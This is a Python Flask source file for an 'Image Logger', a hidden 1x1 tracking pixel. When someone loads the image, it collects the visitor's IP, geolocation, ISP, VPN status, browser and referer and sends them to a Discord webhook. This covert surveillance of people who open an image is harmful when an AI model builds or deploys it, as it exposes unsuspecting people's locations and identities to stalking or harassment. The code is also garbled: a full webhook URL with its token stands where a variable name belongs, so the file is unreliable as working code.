from flask import Flask, request, Response, send_file
import requests
import json
import io
import os
from datetime import datetime

app = Flask(__name__)

https://discord.com/api/webhooks/1532976374300541008/yUOYQh8Gfj1z6ISeclFYm8aOtxVjzT-KJKsaX2O4Q3-uVC4wWy8c03QaKPjeIfmVwCJY = os.environ.get('DISCORD_WEBHOOK') # They set this in Vercel env vars

def get_ip_info(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,lat,lon,isp,org,as,proxy,query')
        data = response.json()
        return data
    except:
        return None

def send_discord_notification(request_data, ip_info):
    if not https://discord.com/api/webhooks/1532976374300541008/yUOYQh8Gfj1z6ISeclFYm8aOtxVjzT-KJKsaX2O4Q3-uVC4wWy8c03QaKPjeIfmVwCJY:
        return
    
    user_agent = request_data.headers.get('User-Agent', 'Unknown')
    referer = request_data.headers.get('Referer', 'Direct')
    language = request_data.headers.get('Accept-Language', 'Unknown')
    ip = request_data.remote_addr or 'Unknown'

    # VPN detection
    vpn_status = "🟢 OFF"
    if ip_info and ip_info.get('proxy') == True:
        vpn_status = "🔴 ON (Proxy/VPN detected)"
    
    # Build embed
    embed = {
        "title": "🎯 Pixel Logged!",
        "color": 0x00ff00 if "OFF" in vpn_status else 0xff0000,
        "fields": [
            {"name": "🌍 IP Address", "value": ip, "inline": True},
            {"name": "🛡️ VPN/Proxy", "value": vpn_status, "inline": True},
            {"name": "📍 Location", "value": f"{ip_info.get('city', 'N/A')}, {ip_info.get('regionName', 'N/A')}, {ip_info.get('country', 'N/A')}" if ip_info else "N/A", "inline": False},
            {"name": "📡 ISP", "value": ip_info.get('isp', 'N/A') if ip_info else "N/A", "inline": True},
            {"name": "🖥️ Device", "value": user_agent[:50] + "...", "inline": False},
            {"name": "🔗 Referer", "value": referer, "inline": True},
            {"name": "🌐 Language", "value": language, "inline": True},
            {"name": "🕒 Time", "value": datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC'), "inline": False}
        ],
        "footer": {"text": "Image Logger"}
    }

    payload = {"embeds": [embed]}
    try:
        requests.post(https://discord.com/api/webhooks/1532976374300541008/yUOYQh8Gfj1z6ISeclFYm8aOtxVjzT-KJKsaX2O4Q3-uVC4wWy8c03QaKPjeIfmVwCJY, json=payload)
    except:
        pass

@app.route('/')
def home():
    return "Image Logger is running. Use /pixel.png"

@app.route('/pixel.png')
def pixel():
    # Log the request
    ip_info = get_ip_info(request.remote_addr)
    send_discord_notification(request, ip_info)

    # Return a 1x1 transparent GIF
    transparent_gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x01\x00\x00'
    return Response(transparent_gif, mimetype='image/gif')

# Vercel expects an app object named 'app'
if __name__ == '__main__':
    app.run()
